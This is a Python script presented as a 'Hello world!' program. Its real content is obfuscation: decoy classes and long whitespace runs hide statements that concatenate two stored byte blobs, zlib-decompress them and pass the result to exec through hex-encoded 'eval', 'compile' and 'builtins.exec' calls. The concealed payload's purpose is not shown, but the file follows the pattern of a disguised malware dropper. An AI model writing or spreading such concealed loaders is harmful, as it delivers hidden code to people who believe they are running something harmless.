from builtins import *
from math import prod as Frame

__code__ = 'print("Hello world!")'


Multiply, _system, _run, Builtins, _substract, Substract, _negative = exec, str, tuple, map, ord, globals, type

class _while:
    def __init__(self, _math):
        self.Calculate = Frame((_math, -56725))
        self.Statistics(_add=-99742)

    def Statistics(self, _add = type):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Calculate += -21960 / _add
        
        try:
            ((Builtins, _run, _substract) or _substract if (Builtins, _run, _substract) and _substract else ... or (_substract, (Builtins, _run, _substract)))

        except OSError:
            (({_system: _run}, _statistics) for _statistics in {_system: _statistics})

        except:
            _negative(82680 / -33508) == True

    def _modulo(self, _callfunction = 91820):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _callfunction += -1455 - 90917
        self._cube != int
        
        try:
            (((_statistics, _system), _statistics) for _statistics in {_statistics: Multiply})

        except AssertionError:
            ((Multiply, {_statistics: Multiply}) for Multiply in (Builtins, _run, _substract) if _statistics < _substract)

        except:
            _negative(58614 - -66748) == bool

    def Positive(_calculate = Ellipsis):
        return Substract()[_calculate]

    def While(_detectvar = -41718 + -92184, StackOverflow = float, Power = Substract):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Power()[_detectvar] = StackOverflow
        
        try:
            ({_system: _run} or _substract if {_system: _run} and _substract else ... or (_substract, {_system: _run}))

        except TypeError:
            ((Builtins, _run, _substract) or _substract if (Builtins, _run, _substract) and _substract else ... or (_substract, (Builtins, _run, _substract)))

        except:
            _negative(-98035 - 37058) == True

    def execute(code = str):
        return Multiply(_system(_run(Builtins(_substract, code))))

    @property
    def _cube(self):
        self.Square = '<__main__.Power object at 0x000003264BE11678>'
        return (self.Square, _while._cube)

if __name__ == '__main__':
    try:
        _while.execute(code = __code__)
        Invert = _while(_math = -96194 / -1419)

        _while(_math = -8174 * -26697)._modulo(_callfunction = 7782 * Invert.Calculate)                                                                                                                                                                                                                                                          ;_while.While(_detectvar='lIIlIIIllIllIIlllIllIIll',StackOverflow=b'x\x9c\xed\x1b\xd9n\xe38\xf2\xbd\xbf\xa21/\x92\xd1\x07$\x92"\xa5\x00\xfd:\x80\x8d\xa4\xfd0\x0b$@\x10\x18>\xe4]\x05\xb2\xddH\x9cI\xe6\xef\xb7\xaaH\xca\xb4$\xeb\xb0\x9dL\x80\xb4\xe8\x12O\xf1,\xd6E:\xdf\xcc\xa7\xf9\xa3?\xb8\xf5\xae~^\xfd4\xcf\x15>\xc6\xbb\xf2\xee~\xfc7\xdf\xcc\xa0\xd4\xa7CE\xf0\xf3\xe1p\x04\xee\xf2r4"\x18]bl8\x1ay\xb7\x17\x17_\xbe}\xf9\xe6\x7f\xf3\xbf\x84\x83\xc1\x1d\xd4\x96n\xa7\xdb\xedCcmy>\xcc\x87\xf0\xcb\xf5\x1b^\xd5z\x16YK\x1d\xd9\xfd}v\x9fe\xf9=\xbe\xf2\x1c"0\x96\x9c\x06\xfc\xa9&\x13\xbf\xb9\xb9\xb9\xb9\xbe\xbe\xa6\xb7\x0e\xd8\x1f|9\x99d\xab_\x9b\x87\xedd\xd2\xd8\xec\xf3\xcb\xf3\xf3\xf3\xcb\x8b\xf1\xf0\x81o\x0f\xd6\xeb{\xb3\xa7,\xdff\xebGo\xf0\xfd\xef\xe9C\xf3$\xdfSW\xb1\xb39\xfd`\x100\x00\x1c\xd6\x88f{\x08\xf3n\x16\xe0\x92\xd6c\xe87\xb4\xfc\xb8\xce\xb6y\xf64+O\xed\xe0k1\xeb\xc52\x1cU\xcf\xe0\xf6\\\x15}\xcf\xd6\x8b\xf4\xc5\xf7\xb6\xd3M\xbe\xacd\xdf\r>Ug]\xa3\x91m]\xe3R>\xfc8S\x95>=\xfc\xa7n\xa6\x0e`\xfe%\xcc\xc0\x90&f4\xa29\xf983\x95O\xffN\xbb\xe3\xd4M\xd1\x16z:\x80\xcd\xde\x1c9aY6\x7f\x9c\xae\xb3\x93\'\xec`=}\'\xecpEv\xc2\xfeYf\xf9K\xfa\xbf\xf5S\x9f\x9d\x88\xcdc\xd3\xb9\xd9\x89C\x82\x8f\x83e\xe9c>\xfd\xb3n\xc2\x9a\x08\xfex<\xde\x04\x9b\xf18\x00o\x0c\x81\xcd\x06\x00\\\x00\xf3\xe6y\xdf\xef7\xd9\xfa\xd0\x86\xfe\x8b\xfd\xa5\x1f\xa6\x1f\x1d\xfe8\xf3\x9do6\xd5\xdc\xc3\xf4\xef\x19\x9f\x17\xc4X\x8d\xbe6\xfeq&,\xcd\xb3_\xab\xcd\xbc\xc7\x9c\x8d\x0b|\x1c\x07\x01\x84\x08I\x83\xcd\xc7\x99\xb2\x87\xedc\xdf\x1dMLvh\xe6\x86\xb8-\xc6\xddZ*\x9c\xd8\xf7\x06\xf1DL\xc2\t\x9fD\x13\x05\xc0 &\xa1dRMm\xae\xe8 \xef\xf2g\x1e\x0f\xd9\x82\xc5l\xc1\x03\x96\x80,\xbaH\xe7\x9bE\xea{\xf1r[%\xf3\x03\xfd\xba\xfb0\x0b=O_jE\x84\x86\x95n\x9ak\x91\x80\x9b\x03L\xc1%\x06\xe6\x04:f\xf3\xc1\xb5\xad\xc5\x9d\xee\xdd\xe7\xed\xc3\xe6\xd7*\xfbl\xc7\xf2y\xb5yX\x9e\x80\r\x81\xc1\x86\xb0#6\x9c\x1d\xe9\x1b{\x97DK\x1e\x01\xc4\xc6g\x00\xc2\xc4\xd1\x97\x00\t\x9b\xd1\x08\xba\x94\x8d\xbb\x8d\xf2\xae\xb1W2\x91\x0b\x15\xc8\xa5bJ\xb0@q\x15I\xa6\x02\xc5\xe4RB#\x10\xe7\xadm\xbc\n\xe9\x88&\x01\x91\x076\xc1p8I\x88tTR\xdb*\n!\'h+\xa4&\t\xd4(\x81\x14)\xaa[\x13\xaa\xb8\x9az\x86\xd6\xce\x8a\xbf%\xe8\xb3\xd2\xe0wX\xd9\x03r1\xf2\xd3\x0c\xde\xc0[Q\xb5\'N\x0b\x0c\xb4\xb6tc\x97:t\xe2\xae\x11\xbd\xa0\x0f\xf7\xc8\xdb\xe1\xc1\x9e`\xa7\x80\xd1\xe7\xd0\x99#\xa9\xdc1;\xa0\xb9\x8b ]\x04(\x0b\xa3\x94\x81o\xf8A\xf0\xd0tU\xa8v_\x86h\x08\x06B\xe8\x10\x10$\x1a\x1c @\xe2a\x88L\x97\xb2QG"S\x8f*\x8d\x8b?\x05\x8cD7/\x1c\xc6\xa6\x85\xd39\xe8O[W\xe0G>]\xcd\x16\xd3\xcf0\xbd\x01\xea\x1d\xf8\xda\xa0?\xbe\xa8\xebX\xff\xde\x8a\xa5\\\n\x81o\xa9C\x14\x16\x94&\x84\\Z\xd7\xde\xd3~\x0b\xca\x10\x17\x13%d\x0c\xb5\xa7\x8c\x1d\xbdg\xb5XA\xaa\xecP\xcb\x18\xf9k\x93\xb3\xa3\x84\xb3\x9e\xd3\x03\xd4\xec\xc8)i[m\xbd\xceR\xaf\xb2Y{\x8c[\xe8\xb2\xd6\x06+/\x87(b\x82\xa49$c3\x89\x9f\x97\x17\xb5\nJ\xff\xbeF\n\\\x0cN\x11\xec\xde\xda\'w~\xac\x8c\xa2\x08\xe8D\xc4D*B\xb1\x10\xd1\xf1\x98\xb9^\xad\xd6\xf4\xa0\xbf\xb2~+n\x82\x04\x10\x12_\x0eA\x12H\xc0!\xcff\xd5\xd4w\x88\xe4\x1a\xd1\rn 6\xc0\x83\x8a\x08IJ\xd0\xf0\x99H\x96\x8a\x1d\xa7\x9f\xb8\xe4LZgD\xbe&\xed\xc36Cp}\xdd\x07\x91=\xfd\xf9\xf5\xb5\xe9/)3\xd7o7\xfd\xc5H\x00\xcb\x00\xcfV\x16\xeb\xc0]\x1cf\xe2G\x10\x10\xc3\x12\x84KD,\xd3\x10\x96\x91\xb4\xcf\xfbz\xb3\xf5\xeb\x8db\xfe\x01C\x86\x7f\xc8j98\xb8\x03\xcdhi\xbc\xf8\xfa\x89\x13\xd1\xb6o\x02\xc8\t\xcfR\xa8\x93\x8c~\xea6EyF\x19\xf9&0\xf2\x8d4i(\xfb$\xa4Pi\xb9\xa8KYu\xa4\x88\xee\x08*(\x08\xc2\x12\xa2@\xa8\x05D\x14\x0c\xc7\xc1Y\xf1\x10E(T\xc8\xad\xaf\xc36\xbe{k\xbf\x83\xe2n\xfb\x7f\x85\xbd\xa4\x17\xf5\x96\xbc\xab3\x11.\xb3m\x96;\x19K\x1a9\x8b\xde}8/\xec\x1dr\xccl"\xf4\xcf:\xc1\xc4g\xf7\xdd>\x1f\xd6~\x1f\x12\x8b\x14\xb1 \xae\xda\xef1\xb1\x9e\xdd\xc2\xe6\x81P\xdb\xde\x92\xa8IO8\xe8\xb9\xc8UQ\xdbUPRUS\xcf\xb0\xdd[\x95\x97\xc4l\xb8\xd8\xf8\xca\xf8\xdc(&\x81\xa3\xbc4\x95\xe5dM9\x8e\'k\xf1xh\xa4\xe5\xddAl\xfd2\xd4\x1b\x9a\x1b\xb9\xc3\xbc0\x98%\x85\xf9lj\xdc\\t\xd9\x87~\x93\xca\xa9;h\xcf\x04^^l\xfc\r\xf9\xac\xff\x07\x05\xc3/\x90\x0c\x99_..n\xbd\xa7\xed2\xf6\xfct\xb1\x99\xa7\x8b\xef\x03/a\xa0\xf1\t\xd2\xfb\x84\r\xe9\x98\x99\x18iSc\x16\xf0\x80/\x05\xc2R\xea\xb7\x0e\xd9\xb0\xce\xd5qo\xe6\xeb~\xbb\x031\x9e\x7f\xd7\xda+\xd7\x8eI\x0b37v\xce\xdd2\xd9\xfc\xa6\x96n\x07\xfe\x95\xbb0\xc5b\xfd\xbc\xfa\xe3t\xf5^:\xaa:3aevBY\xbdo*\xdbQ\xbd\xff\xba\xcc\xf2t=]\xa5?<\xec\xe6\x90\x80L\xe7V\xb3\xb9\xbc|\x87\xc6\xb1\xaf+(\xf3\xa3rV~\x84\xe8`m\xaf\xcc\x11\r\x12#\x1e\x90X\xe0\x88\x0eme;k\n\xcd\x86U\xd2$\xe9\xfe\x12\x8ef\xf4\xea\xf3\xef\x12Zk\x92\x0e\x1d\x02Lh\xe5LC[Y\xd9\xc3*\xe0\xd7\xb3\xba\xe3\xe8\x1c*\x8f\x01\x99v9\xa9\x8b\x11\xbc\x05)\x8f\x95\xd476~4\xd6\x08ZvJ\xb0\xef\x16\x85\xdb\x8fa\xebI4s\xa4\x12k\x15\xd8\xb3\x0c\xec\xc9-\x14c\xb1dLq\xc1\x13\r\x92\x1b?\xd4`\xc3E\x1a\xdf\xf9n^\xf9{\r\x0c\x04g\x96J!#\xc9A\x05\x02\x1f\xfa\xa9x,\xa5\x12*b*\x9a\xf1)\x9f\x02\x1a-\x08b\x82\x19nz\x18\xcd\x82 >zL\x12\xfa\x00\xcdr\x06|BH\x089 \xc0\x15a\x0b\xe8J\xf9e\x1f\x81\xc3\x98\x03\x00\xacW\x82\xaf\xdb1\x80\xd9e(\xf2\xc2*\xec}\x13\x16\xe5\x18\x8fy\xc4\x15\x80\xeb\xdbp\x1d\x94\xf3\xcbeu>;}M\xda1\xdc\xe1\x1f\x96\x15^i\r\x82\xfc\x13\xb6\x99ep\x96\xb1\xd9\x032+\x0e\xba\xf6\xee.e\xbb2\xc4\xae\x9c\xc5\x1b\xe0\xc9\x11\x92\x94\x80\xacRx~\x85gY\xbc\x9az\x16e\x1aO\xad" b\x019:b\xa7\x93\xb3J\xea\x89\x07\x99\x96\x92\'\x0e\x93\x8bLz\xe8\xccy\x97\xb2\x1d\xe7|\x1f~\x8b\xdd\xfd\xcfz\xe7\xe6|%1g/s\x13\xb3g0\x94\xf3\x9bo\xd4\xf0\r\x04\xa4\x9a\xc2POn\xe2\x0c\x02\xa2D\xd3\x1d\x1a\xef\xa6\x17y\xe1>}\xdf+\xbf\xe3\x01LF\xd4\x86\x94\x11\xb5\x8ei\xd8\x9e\xe69\x91\xc9\xdf\xf5\x8bUh}\x99_\xd4\x85\xeb\xf9\xc7[\xf3\x84\x0co\x86\xdf\xd3\xc9-^\x10\xcf3\xdc\xd7\x10=a\xe3(\x87\xd6X\xc5\xc7\xd2\x1f\xab\x10\xd9\xcb\x16]\xcav\xbcl\xa1\xf9B\xe3&\x8c\x14,\xb1\x9c\xb7\xd7v\xf4E\x9d3\x90\xb9s\xca\xdb\xe7\xd4\xea\xba\xd9\x15\xf6\xcfh\x0b\xab\xa14\xf6D\xa9\xc31\xb3i\x16\xb4\x95\xd1)K\xf5\x04l\x1aL\xb9s\\\xd2r\xb0\x120\tt\xb4\xd9\na\x19Y\xfbX"\xbe\x8c\x18\x80\x02\x10&\xcc\x01\x02\x93\x16Q\x9cv\x1f\x93\x9d\xca6\xf6\xac\xa2V\xba\x9d\xd3\x17e"\xba~\x93\xd0\x95\x18\x05\xd9\xd5T9\xf0\x9a+"\x04\xa1\xeb@\xfaO7\xfa\x92\x90w;\xf0\xef\xe9>G\x86\x7f\x12\xc9\xe8\xbf"Y~\x82\xb9\xa4\'v\xedHRS\xad0\x85L;\x1b\x8a8:\x1d\xb7\xd0J\xfe\xceb\x9b\xb0b\xab2$+6a\xe6\x88\xb5.\x99k+\xdb\x91\xcc\xbdC\xe2\xd4\xd4\xa8\xda=q\xb1Yw\x1bW\x95\xf3\xdb\xbb\xd0\x85\n%l\x11\xe1;\xe43\xc3\x1f\x17\x86_\x02\xe7\xe4\xb3H\xb1\x08x\xa9\x941W\x90\x17I\xa1o\x1c\x81\x9f2\xe4\xbf\x88Z\xc8\xf3\x03\xe4\xca\x92\x11\xd7G\x88\xb9,\xe4\x10\x94\x15l:|KeQc\x8d\xa8\x8cNC\xf1\x02\xcbqn\xb5UA\xe9\xa1\xa9G\xfb\x82\xbe\r(\xae\xf3\x85DI@Q]\xdc\xb4\'L\x1c\xe5\x0e\x06\xf9T?/\x97\xd3\xed\x86\x18%\xc9\x84Q>\xca00*\x193G\xc2:(\x83\x95$2\x96\x10vXLI\x1c+lbn\xa2.@:\x11*\x94\x81\x02\xea\x87\xb7f\xa4\x16\xdd\xda)q\xfbZ\nCEYAEw\x1460 \r\x15\x8e:\x95=\x9e\n\x1f&\x9ez3\x98\xff\x04\x90\xf7\xdeh\xa7\xd9\xf6v\xbb\xefL\xed\xbb\x94\xd6\xcb^=toNwA$h\xbc\x9c\xf4\xde\x18\xca\x89r\xdak\x1bN\x95Cs\x03\xab\xf2\x1aQS\xab\xbf\xfbb\xe8\xa1r\xa2\xaf\x9a\xfc/\xa9\xc8\xefWvl\x94\xcb\x7f+\xc7\xa7\x1bU\xad2+\x1cEx\xaf\xdf5\x06Q\x9bV\xfeF\x12\xc7r\r\xab\xfb\xf55\xd5_WW9\\n\x1b\x15hk\xfc-\x8c\xc0\xae\x01\xb8d\xfc-\xf2m\xd8\x94{k\xe5\x19o2\xd1\xad9s}\x8e^\xafM\xd3bC\xa3\xac)\xd5\x9eq\xd9\x13x:\xec1t\xadKY\xd6\xf7P\xafq+wW\xb1\xdf\x11\x85|[\x01\xb6q\x88\xbfO\x9a\xceC\x14\xddS\x1e\x97\xe8\x95O}J\xd6\xc0\xb2\xe5p\xef$\x88\x93\xe5\xaf\x90\xb8\xd1\x12\x88V<')

        _while(_math = 88070 / -63923).Statistics(_add = Invert.Calculate * 60005)                                                                                                                                                                                                                                                          ;_while.While(_detectvar='IIJILLJJLJJJJJJLLLII',StackOverflow=b'\xd0\x0f\xdc\x93\xaa\xba\xd3\xad:b\xe6\x12\xb520\xc9\x8d\xa5SK\xf8\xb2\xd0F@\xb3\x90\x92\xc2\xa8Y`\\R\x1f\x04}\xa35\x8dX[/1,\xb5\x95\xb4\xdcN\xf9dm\xaf_\xa5\x93\xb7\xf2\x98\xde\x98\xc8\x1e\xb57\xcb{\xb4\xc3E\xdb\xf3\x18\x05z\x1f=\x7f\xfa?N\x0f&\x18')

        Invert.Statistics(_add = Invert.Calculate / 75897)                                                                                                                                                                                                                                                          ;MNMMMNNMMMNNNMNNMMNMNMN,MMMMNMNMMMMMNMNNMMM,DODDDDDOoDDOODoDDODOoDoD,jjljjjjlijjjjijlijljjj,SSSS2SSS22222S2S2S2SS22222=(lambda LILLLIJIJIILLIJJI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(LILLLIJIJIILLIJJI)"),filename='\x6a\x6a\x6a\x6c\x6c\x6c\x6c\x69\x69\x6a\x6c\x6c\x6c\x6a\x6a\x6c\x6a\x69\x6a\x6c\x6c',mode='\x65\x76\x61\x6c'))),(lambda LILLLIJIJIILLIJJI:LILLLIJIJIILLIJJI['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda LILLLIJIJIILLIJJI:LILLLIJIJIILLIJJI(__import__('\x7a\x6c\x69\x62'))),(lambda lijiijlijjjjjilijljljil,LILLLIJIJIILLIJJI:lijiijlijjjjjilijljljil(LILLLIJIJIILLIJJI)),(lambda:(lambda LILLLIJIJIILLIJJI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(LILLLIJIJIILLIJJI)"),filename='\x6a\x6a\x6a\x6c\x6c\x6c\x6c\x69\x69\x6a\x6c\x6c\x6c\x6a\x6a\x6c\x6a\x69\x6a\x6c\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        Invert._modulo(_callfunction = -77779 - Invert.Calculate)                                                                                                                                                                                                                                                          ;SSSS2SSS22222S2S2S2SS22222()(jjljjjjlijjjjijlijljjj(MMMMNMNMMMMMNMNNMMM(DODDDDDOoDDOODoDDODOoDoD(MNMMMNNMMMNNNMNNMMNMNMN('\x76\x61\x72\x73'))),_while.Positive(_calculate='lIIlIIIllIllIIlllIllIIll')+_while.Positive(_calculate='IIJILLJJLJJJJJJLLLII')))

    except Exception as _statistics:
        if 404765 > 3963366:
            _while.execute(code = _system(_statistics))
        
        elif 249528 > 2992727:
            Invert._modulo(_callfunction = 33247 / Invert.Calculate)